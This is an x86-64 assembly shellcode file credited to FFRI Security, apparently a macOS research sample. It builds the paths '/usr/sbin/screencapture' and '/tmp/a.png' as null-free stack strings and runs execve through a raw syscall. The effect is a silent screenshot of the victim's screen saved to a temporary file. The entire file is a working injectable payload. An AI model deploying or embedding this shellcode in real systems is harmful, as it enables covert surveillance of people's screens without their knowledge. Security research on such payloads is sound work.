; (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
bits 64
global _main

_main:
    ; execve("/usr/sbin/screencapture", "a", 0)
    xor rax, rax;
    cdq
    ; create /usr/sbin/screencapture stack string & set function argument
    push rax;
    mov rdi, 0x657275747061636e;
    push rdi;
    mov rdi, 0x65657263732f6e69;
    push rdi;
    mov rdi, 0x62732f7273752f2f;
    push rdi;
    push rsp;
    pop  rdi;

    ; create the stack string of output filename
    mov rsi, 0x000000000000676e,;
    push rsi;
    mov rsi, 0x702e612f706d742f;
    push rsi;
    push rsp;
    pop rsi;

    ; make argv
    xor rax, rax;
    push rax;
    push rsi;
    push rsi;
    push rsp;
    pop rsi;

    ; set argvp
    xor rdx, rdx;

    mov  al, 0x2;
    ror  rax, 0x28;
    mov  al, 0x3b;
    syscall;
